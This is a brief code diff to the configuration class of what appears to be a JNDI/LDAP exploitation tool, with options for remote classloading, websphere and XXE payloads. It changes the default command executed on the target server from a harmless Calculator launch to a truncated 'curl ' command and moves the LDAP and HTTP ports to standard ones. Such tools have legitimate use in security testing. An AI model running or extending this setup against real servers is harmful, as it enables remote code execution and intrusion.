@@ -10,7 +10,7 @@ import java.net.UnknownHostException;
 public class Config {
 
     @Parameter(names = {"-c", "--command"}, description = "Command to execute on the target server", order = 0)
-    public static String command = "/Applications/Calculator.app/Contents/MacOS/Calculator";
+    public static String command = "curl ";
 
     @Parameter(names = {"-n", "--hostname"}, description = "Local HTTP server hostname " +
             "(required for remote classloading and websphere payloads)", order = 1)
@@ -25,10 +25,10 @@ public class Config {
     }
 
     @Parameter(names = {"-l", "--ldapPort"}, description = "Ldap bind port", order = 2)
-    public static int ldapPort = 1389;
+    public static int ldapPort = 389;
 
     @Parameter(names = {"-p", "--httpPort"}, description = "Http bind port", order = 3)
-    public static int httpPort = 8000;
+    public static int httpPort = 80;
 
     @Parameter(names = {"--wsdl"}, description = "[websphere1 payload option] WSDL file with XXE payload", order = 4)
     public static String wsdl = "/list.wsdl";
